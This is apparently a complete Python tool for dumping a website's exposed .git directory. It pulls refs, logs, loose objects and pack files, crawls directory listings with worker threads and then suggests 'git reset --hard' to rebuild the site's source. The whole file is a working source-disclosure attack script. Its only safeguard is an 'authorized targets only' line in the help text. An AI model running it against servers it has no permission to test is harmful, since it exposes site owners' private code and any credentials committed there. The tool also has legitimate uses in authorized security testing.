import argparse
import re
import zlib
from dataclasses import dataclass, field
from pathlib import Path
from queue import Queue
from threading import Lock, Thread
from typing import Iterable
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup


SHA1_RE = re.compile(r"^[0-9a-f]{40}$")
COMMON_REF_NAMES = (
    "refs/heads/main",
    "refs/heads/master",
    "refs/heads/dev",
    "refs/heads/develop",
    "refs/heads/staging",
    "refs/heads/test",
    "refs/remotes/origin/main",
    "refs/remotes/origin/master",
    "refs/tags/v1.0",
)
COMMON_FILES = (
    "HEAD",
    "index",
    "config",
    "description",
    "packed-refs",
    "objects/info/packs",
    "objects/info/alternates",
    "info/refs",
    "logs/HEAD",
)


def normalize_git_url(url: str) -> str:
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    if not url.rstrip("/").endswith(".git"):
        url = url.rstrip("/") + "/.git"

    return url.rstrip("/") + "/"


def safe_path(base_dir: Path, relative_path: str) -> Path:
    target = (base_dir / relative_path).resolve()
    base = base_dir.resolve()

    try:
        target.relative_to(base)
    except ValueError as exc:
        raise ValueError(f"unsafe path: {relative_path}") from exc

    return target


def should_skip_existing(file_path: Path) -> bool:
    if not file_path.exists():
        return False

    try:
        data = file_path.read_text(encoding="utf-8")
        return "系统发生错误" not in data
    except UnicodeDecodeError:
        return True


def is_probably_html(content: bytes) -> bool:
    head = content[:200].lstrip().lower()
    return head.startswith((b"<!doctype html", b"<html", b"<head", b"<body"))


@dataclass
class Stats:
    downloaded: int = 0
    skipped: int = 0
    missing: int = 0
    errors: int = 0
    listed_dirs: int = 0
    lock: Lock = field(default_factory=Lock)

    def add(self, name: str, amount: int = 1) -> None:
        with self.lock:
            setattr(self, name, getattr(self, name) + amount)


class GitDownloader:
    def __init__(self, base_url: str, output_dir: Path, timeout: int, verbose: bool, debug: bool) -> None:
        self.base_url = base_url
        self.output_dir = output_dir
        self.timeout = timeout
        self.verbose = verbose
        self.debug = debug
        self.session = requests.Session()
        self.stats = Stats()
        self.seen_objects: set[str] = set()
        self.print_lock = Lock()

    def log(self, message: str) -> None:
        if self.verbose:
            print(message)

    def debug_request(self, url: str, status: int | str, size: int | None) -> None:
        if not self.debug:
            return

        size_text = "-" if size is None else str(size)
        with self.print_lock:
            print(f"debug request: url={url} status={status} size={size_text}B")

    def remote_url(self, path: str) -> str:
        return urljoin(self.base_url, path)

    def local_path(self, path: str) -> Path:
        return safe_path(self.output_dir, path)

    def get(self, path: str) -> requests.Response | None:
        url = self.remote_url(path)
        try:
            res = self.session.get(url, timeout=self.timeout)
            self.debug_request(url, res.status_code, len(res.content))
            return res
        except requests.RequestException as exc:
            self.stats.add("errors")
            self.debug_request(url, "ERROR", None)
            print(f"request error: {url} - {exc}")
            return None

    def download(self, path: str, allow_html: bool = False) -> bytes | None:
        local = self.local_path(path)
        if should_skip_existing(local):
            self.stats.add("skipped")
            return local.read_bytes()

        res = self.get(path)
        if res is None:
            return None

        if res.status_code != 200:
            self.stats.add("missing")
            self.log(f"missing [{res.status_code}]: {self.remote_url(path)}")
            return None

        if not allow_html and is_probably_html(res.content):
            self.stats.add("missing")
            self.log(f"ignored html response: {self.remote_url(path)}")
            return None

        local.parent.mkdir(parents=True, exist_ok=True)
        local.write_bytes(res.content)
        self.stats.add("downloaded")
        print(f"download: {local}")
        return res.content

    def fetch_common_files(self) -> list[str]:
        refs: list[str] = []

        for path in COMMON_FILES:
            data = self.download(path)
            refs.extend(extract_refs(path, data))
            refs.extend(extract_shas(data))

        head = self.local_path("HEAD")
        if head.exists():
            text = head.read_text(encoding="utf-8", errors="ignore").strip()
            if text.startswith("ref: "):
                refs.append(text[5:].strip())

        for ref in sorted(set(COMMON_REF_NAMES + tuple(r for r in refs if r.startswith("refs/")))):
            data = self.download(ref)
            refs.extend(extract_shas(data))

        return refs

    def fetch_loose_object(self, sha: str) -> bytes | None:
        if not SHA1_RE.match(sha) or sha in self.seen_objects:
            return None

        self.seen_objects.add(sha)
        path = f"objects/{sha[:2]}/{sha[2:]}"
        data = self.download(path)
        if not data:
            return None

        try:
            return zlib.decompress(data)
        except zlib.error:
            self.stats.add("errors")
            self.log(f"cannot decompress object: {sha}")
            return None

    def walk_objects(self, shas: Iterable[str]) -> None:
        queue: Queue[str] = Queue()
        queued: set[str] = set()

        for sha in shas:
            if SHA1_RE.match(sha) and sha not in queued:
                queue.put(sha)
                queued.add(sha)

        while not queue.empty():
            sha = queue.get()
            raw = self.fetch_loose_object(sha)
            if raw:
                for child in parse_object_links(raw):
                    if child not in queued:
                        queue.put(child)
                        queued.add(child)
            queue.task_done()

    def fetch_pack_files(self) -> None:
        data = self.download("objects/info/packs")
        if not data:
            return

        text = data.decode("utf-8", errors="ignore")
        for line in text.splitlines():
            line = line.strip()
            if not line.startswith("P "):
                continue

            pack_name = line[2:].strip()
            if not pack_name.startswith("pack-"):
                continue

            self.download(f"objects/pack/{pack_name}")
            self.download(f"objects/pack/{pack_name.removesuffix('.pack')}.idx")

    def crawl_directory_listing(self, threads: int) -> None:
        queue: Queue[str | None] = Queue()
        queue.put("")

        def worker() -> None:
            session = requests.Session()
            while True:
                path = queue.get()
                if path is None:
                    queue.task_done()
                    break

                url = self.remote_url(path)
                try:
                    res = session.get(url, timeout=self.timeout)
                    self.debug_request(url, res.status_code, len(res.content))
                except requests.RequestException as exc:
                    self.stats.add("errors")
                    self.debug_request(url, "ERROR", None)
                    print(f"request error: {url} - {exc}")
                    queue.task_done()
                    continue

                if res.status_code != 200:
                    self.log(f"tree unavailable [{res.status_code}]: {url}")
                    queue.task_done()
                    continue

                self.stats.add("listed_dirs")
                soup = BeautifulSoup(res.text, "html.parser")
                for tag in soup.find_all("a"):
                    href = tag.get("href")
                    if not href or href == "../":
                        continue
                    if href.startswith(("http://", "https://", "?")):
                        continue

                    child_path = path + href
                    if href.endswith("/"):
                        queue.put(child_path)
                    else:
                        self.download(child_path, allow_html=False)

                queue.task_done()

        workers = []
        for _ in range(max(1, threads)):
            thread = Thread(target=worker, daemon=True)
            thread.start()
            workers.append(thread)

        queue.join()
        for _ in workers:
            queue.put(None)
        for thread in workers:
            thread.join()


def extract_refs(path: str, data: bytes | None) -> list[str]:
    if not data:
        return []

    refs = []
    text = data.decode("utf-8", errors="ignore")
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if path == "packed-refs":
            parts = line.split()
            if len(parts) == 2 and parts[1].startswith("refs/"):
                refs.append(parts[1])
        elif path in {"info/refs", "logs/HEAD"}:
            refs.extend(part for part in line.split() if part.startswith("refs/"))
    return refs


def extract_shas(data: bytes | None) -> list[str]:
    if not data:
        return []

    text = data.decode("utf-8", errors="ignore")
    return re.findall(r"\b[0-9a-f]{40}\b", text)


def parse_object_links(raw: bytes) -> list[str]:
    header, _, body = raw.partition(b"\x00")
    object_type = header.split(b" ", 1)[0]

    if object_type == b"commit":
        return extract_shas(body)

    if object_type != b"tree":
        return []

    shas = []
    index = 0
    while index < len(body):
        nul = body.find(b"\x00", index)
        if nul == -1 or nul + 21 > len(body):
            break
        sha = body[nul + 1 : nul + 21].hex()
        shas.append(sha)
        index = nul + 21
    return shas


def validate_url(url: str) -> None:
    parsed = urlparse(url)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        raise SystemExit(f"invalid URL: {url}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Recover an exposed .git directory. Use only on authorized targets."
    )
    parser.add_argument("url_arg", nargs="?", help="target .git URL, e.g. https://example.com/.git/")
    parser.add_argument("-u", "--url", help="target .git URL, e.g. https://example.com/.git/")
    parser.add_argument("-o", "--output", default="create/.git", help="output directory")
    parser.add_argument("-t", "--threads", type=int, default=16, help="directory-listing worker threads")
    parser.add_argument("--timeout", type=int, default=10, help="request timeout seconds")
    parser.add_argument("--no-tree", action="store_true", help="skip directory-index crawling")
    parser.add_argument("-v", "--verbose", action="store_true", help="print missing paths and tree errors")
    parser.add_argument("--debug", action="store_true", help="print every request URL, status and response size")

    args = parser.parse_args()
    target_url = args.url or args.url_arg
    if not target_url:
        parser.error("target URL is required, use -u/--url or positional url")

    base_url = normalize_git_url(target_url)
    validate_url(base_url)

    output_dir = Path(args.output).resolve()
    downloader = GitDownloader(base_url, output_dir, args.timeout, args.verbose, args.debug)

    print(f"target: {base_url}")
    print(f"output: {output_dir}")

    discovered = downloader.fetch_common_files()
    downloader.walk_objects(discovered)
    downloader.fetch_pack_files()

    if not args.no_tree:
        downloader.crawl_directory_listing(args.threads)

    stats = downloader.stats
    print(
        "done: "
        f"{output_dir} "
        f"(downloaded={stats.downloaded}, skipped={stats.skipped}, "
        f"missing={stats.missing}, errors={stats.errors}, listed_dirs={stats.listed_dirs})"
    )
    print(f"next: cd {output_dir.parent} && git reset --hard")


if __name__ == "__main__":
    main()
